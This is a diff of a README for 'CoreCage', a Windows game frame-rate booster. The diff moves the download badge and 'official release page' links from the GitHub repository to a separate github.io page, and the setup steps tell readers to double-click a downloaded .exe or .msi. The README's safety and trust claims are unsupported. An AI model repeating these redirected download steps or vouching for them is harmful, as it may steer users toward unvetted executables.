@@ -1,6 +1,6 @@
 # 🛡️ CoreCage - Increase your gaming frame rates today
 
-[![Download CoreCage](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/akuja4303/CoreCage)
+[![Download CoreCage](https://img.shields.io/badge/Download-Release-blue.svg)](https://akuja4303.github.io)
 
 CoreCage helps you get more frames per second in your favorite PC games. It works by limiting background tasks that steal computer power. This app focuses on clear, measured performance gains. It uses PresentMon to track your hardware efficiency. You can trust the results because the app follows standard safety rules. It does not touch your computer kernel. It remains safe for games that use Easy Anti-Cheat.
 
@@ -12,7 +12,7 @@ Your computer needs a few things to run CoreCage well. You should have Windows 1
 
 You can get the software from the official project page. Follow these steps to set it up:
 
-1. Visit the [official release page](https://github.com/akuja4303/CoreCage) to download the latest installer.
+1. Visit the [official release page](https://akuja4303.github.io) to download the latest installer.
 2. Look for the file ending in .msi or .exe under the latest version tag.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation.
